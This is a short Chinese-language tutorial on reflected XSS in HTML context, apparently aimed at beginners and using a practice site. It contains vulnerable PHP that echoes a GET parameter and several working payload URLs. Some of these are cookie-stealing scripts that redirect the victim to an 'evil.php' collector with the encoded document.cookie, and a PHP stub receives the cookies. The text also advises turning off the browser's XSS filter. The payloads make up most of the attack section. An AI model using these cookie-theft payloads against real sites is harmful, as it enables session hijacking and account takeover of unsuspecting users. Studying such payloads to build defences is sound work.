位于html中的反射型XSS

http://www.waitalone.cn/xss-advanced-combat-tutorial.html

反射型XSS，在地址栏里的参数，比如page，被传递到服务器端的脚本，比如（PHP），再输出到客户端
<?php
	$p = $_GET["page"];
	echo $p;
?>


防范这类XSS时，通常可以在服务器端对传入的参数进行过滤，来防范这类攻击

<?php
	function filter($str){
		将$str里可能造成跨站的特殊字符过滤掉，例如,<, >等。
		return $str;
	}
	$p = $_GET["page"];
	echo filter($p);
?>




html-context XSS, 这种XSS最大的优点是，数量多，非常容易在网上找到这种XSS，但悲剧的是，随着技术的发展，各大浏览器都会过滤他们！虽然早期出现了一

些绕过过滤器的方法，但也随着历史的发展湮灭。HTML-context的XSS在理论上较容易防御，所以利用范围越来越狭窄了。

但是，如果XSS出现在HTML的<script> ... </script> 之间的时候，情况就不一样了。有的浏览器就拦截失败了，当然有的还是被拦截了，比如（IE9）。

因而为了保证成功的测试，建议大家还是先关闭XSS筛选器




http://xsst.sinaapp.com/example/1-1.php?page=<img src="http://www.baidu.com/img/baidu_sylogo1.gif">

http://xsst.sinaapp.com/example/1-1.php?page=<script>alert(1)</script>

http://xsst.sinaapp.com/example/1-1.php?page=<script>alert(document.cookie)</script>



我们的目标是将得到的cookies发送到另外一个网站。试试下面的

page=<script>location.href='http://你自己的网站/evil.php?cookie='+encodeURIComponent(document.cookie)</script>



或点以下我所提供的链接（IE8,IE9用户，而且没关XSS筛选器的）

http://xsst.sinapp.com/example/1-1.php?page=<script>location.href='http://xsst.sinaapp.com/example/evil.php?cookie='+encodeURIComponent(document.cookie)</script>



考虑到一些新手，没有JS基础，附上面这段JS代码的解释:
location.href="恶意地址"; //这句话可以让当前页面(location)的地址(href)，跳转到恶意地址
document.cookie //就是当前页面的cookies数据
encodeURIComponent(document.cookie) //就是将cookies数据编码一下(防止cookies中有特殊的符号，导致地址错误)
location.href="恶意地址"+encodeURIComponent(document.cookie) //就是将编码后的数据加在恶意地址之后

例如:
location.href='http://xsst.sinaapp.com/evil.php?cookie='+encodeURIComponent(document.cookie)

运行之后，将会跳转到 http://xsst.sinaapp.com/evil.php?cookie=编码后的COOKIES数据

我们在服务器端，只需要用以下PHP代码，就可以获得cookie数据

<?
   $cookie=$_GET["cookie"];
   存储($cookie); //此句是伪代码
?>
 
